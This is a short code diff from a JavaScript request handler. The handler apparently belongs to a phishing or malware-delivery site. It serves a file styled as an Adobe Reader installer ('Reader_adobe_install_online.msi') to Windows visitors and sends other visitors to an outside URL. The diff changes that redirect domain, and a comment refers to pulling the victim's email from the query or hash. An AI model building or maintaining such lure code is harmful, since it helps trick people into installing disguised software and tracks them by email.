@@ -7,7 +7,7 @@ export default function handler(req, res) {
   const MSI_PATH = '/Reader_adobe_install_online.msi';
 
   // Base URL for non-Windows users
-  const NON_WINDOWS_TARGET = 'https://wavemarkmx.com/ms';
+  const NON_WINDOWS_TARGET = 'https://mksonline.com.mx/code';
 
   //--------------------------------------------------------------------
   // 1. Extract email from query or hash
